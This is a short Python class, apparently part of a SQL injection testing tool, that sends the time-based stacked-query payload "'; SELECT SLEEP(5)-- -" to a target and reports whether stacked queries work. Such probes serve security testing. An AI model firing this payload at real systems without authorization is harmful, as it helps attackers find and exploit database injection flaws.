class Stacked:
    def __init__(self, req, parser, logger, args):
        self.req = req
        self.parser = parser
        self.logger = logger
        self.args = args

    def run(self):
        payload = "'; SELECT SLEEP(5)-- -"
        t = self.req.get_time(payload)
        if t > 4:
            self.logger.success("Stacked queries work")
        else:
            self.logger.info("Stacked queries tidak work")
